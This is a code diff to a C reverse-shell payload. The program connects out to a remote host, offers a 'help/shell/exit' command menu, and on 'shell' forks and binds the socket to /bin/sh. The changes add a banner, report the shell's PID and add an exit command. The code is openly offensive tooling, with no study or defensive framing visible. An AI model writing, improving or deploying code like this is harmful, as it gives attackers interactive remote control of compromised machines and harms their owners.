@@ -25,13 +25,13 @@ int main(void){
     connection_established = connect(sockt, (struct sockaddr *)&sa, sizeof(sa)); 
   }
   while(connection_established != 0);
-  char* hello = "\n";
+  char* hello = "starting control session - type \"help\" for commands\n";
   write(sockt, hello, strlen(hello));
   
   while (connection_established == 0){
       while((n = read(sockt, buffer, MAXBUF)) > 0){
-      	if(strncmp(buffer, "help\n", 5) == 0){
-	  char* help = "\n\t  Command Session Menu\n-------------------------------------------\nshell - initiates a shell session\nhelp - displays this menu\n\n";
+  if(strncmp(buffer, "help\n", 5) == 0){
+	  char* help = "\n\t  Command Session Menu\n-------------------------------------------\nshell - initiates a shell session\nhelp - displays this menu\nexit - exits payload process\n\n";
 
 	  write(sockt, help, strlen(help));
 	}
@@ -39,12 +39,14 @@ int main(void){
 
 	  int status = 0;
 	  pid_t wpid, child_pid;
-	  char* shell_msg = "\nReverse shell session started\n";
-	  write(sockt, shell_msg, strlen(shell_msg));
   
 	  char *const argv[] = {"/bin/sh", NULL};
 	  if((child_pid = fork()) == 0){
-            dup2(sockt, 0);
+        char shell_msg[50];
+        snprintf(shell_msg, 50, "\nReverse shell session started on PID %ld\n", getpid());
+	    write(sockt, shell_msg, strlen(shell_msg));
+  
+        dup2(sockt, 0);
 	    dup2(sockt, 1);
 	    dup2(sockt, 2);
 	    execve("/bin/sh", argv, NULL);    // Create a child process and start shell inside of it
@@ -55,6 +57,12 @@ int main(void){
 	  char* test_msg = "\nExiting reverse shell session\n";  
 	  write(sockt, test_msg, strlen(test_msg));
 	}
+
+  else if(strncmp(buffer, "exit\n", 5) == 0){
+      char* exit_msg = "\nExiting command session\n";
+      write(sockt, exit_msg, strlen(exit_msg));
+      exit(0);
+  }
 	
 	else{
 	    char* invalid = "Invalid command session command, type \"help\" for a list of commands\n";		
